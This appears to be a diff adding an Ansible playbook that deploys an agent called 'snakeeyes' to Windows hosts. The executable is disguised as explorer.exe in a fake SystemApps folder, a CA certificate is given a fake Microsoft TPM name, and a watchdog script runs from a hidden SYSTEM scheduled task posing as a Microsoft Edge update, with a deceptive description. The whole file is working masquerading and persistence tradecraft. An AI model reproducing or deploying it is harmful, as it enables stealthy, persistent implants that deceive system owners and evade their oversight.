@@ -1,0 +1,117 @@
+---
+- name: Ensure agent directory exists
+  ansible.windows.win_file:
+    path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\"
+    state: directory
+
+- name: Copy Windows agent executable
+  ansible.windows.win_copy:
+    src: "snakeeyes-windows.exe"
+    dest: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"
+
+- name: Ensure cert directory exists
+  ansible.windows.win_file:
+    path: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\"
+    state: directory
+
+- name: Copy CA cert to Windows Host
+  ansible.windows.win_copy:
+    src: "snakeeyes-ca.crt"
+    dest: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"
+
+- name: Deploy watchdog PowerShell script
+  ansible.windows.win_copy:
+    dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
+    content: |
+      $exePath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\explorer.exe'
+      $logPath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\Testing.log'
+
+      function Write-Log {
+          param([string]$Message)
+          $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+          Add-Content -Path $logPath -Value "$ts - $Message"
+      }
+
+      Write-Log "Watchdog started."
+
+      if (-not (Test-Path $exePath)) {
+          Write-Log "ERROR: EXE not found."
+          exit 1
+      }
+
+      $running = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }
+
+      if ($running) {
+          Write-Log "Process already running."
+          exit 0
+      }
+
+      try {
+          Write-Log "Process not running. Starting it now."
+          Start-Process -FilePath $exePath
+          Start-Sleep -Seconds 5
+
+          $runningAfter = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }
+
+          if ($runningAfter) {
+              Write-Log "Process started successfully."
+              exit 0
+          }
+          else {
+              Write-Log "ERROR: Start attempted but process not found afterward."
+              exit 2
+          }
+      }
+      catch {
+          Write-Log "ERROR: $($_.Exception.Message)"
+          exit 3
+      }
+
+- name: Create scheduled task for watchdog
+  ansible.windows.win_powershell:
+    script: |
+      $taskName   = 'MicrosoftEdgeUpdateTaskMachineEN'
+      $scriptPath = 'C:\Program Files\Internet Explorer\MicrosoftEdgeUpdate.ps1'
+
+      $action = New-ScheduledTaskAction `
+        -Execute 'powershell.exe' `
+        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+
+      $triggerStartup = New-ScheduledTaskTrigger -AtStartup
+      $triggerLogon   = New-ScheduledTaskTrigger -AtLogOn
+
+      # Repeating every minute forever by using a daily trigger with 1-day duration,
+      # then it renews again the next day.
+      $triggerRepeat = New-ScheduledTaskTrigger -Daily -At 12:00AM
+      $triggerRepeat.Repetition.Interval = 'PT1M'
+      $triggerRepeat.Repetition.Duration = 'P1D'
+      $triggerRepeat.Repetition.StopAtDurationEnd = $false
+
+      $principal = New-ScheduledTaskPrincipal `
+        -UserId 'SYSTEM' `
+        -LogonType ServiceAccount `
+        -RunLevel Highest
+
+      $settings = New-ScheduledTaskSettingsSet `
+        -AllowStartIfOnBatteries `
+        -DontStopIfGoingOnBatteries `
+        -StartWhenAvailable `
+        -Hidden `
+        -ExecutionTimeLimit (New-TimeSpan -Seconds 0)
+
+      # Do not start a new instance if one is already running
+      $settings.MultipleInstances = 2
+
+      Register-ScheduledTask `
+        -TaskName $taskName `
+        -Description 'Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.' `
+        -Action $action `
+        -Trigger @($triggerStartup, $triggerLogon, $triggerRepeat) `
+        -Principal $principal `
+        -Settings $settings `
+        -Force
+
+- name: Run watchdog once immediately
+  ansible.windows.win_powershell:
+    script: |
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Program Files\Internet Explorer\MicrosoftEdgeUpdate.ps1"
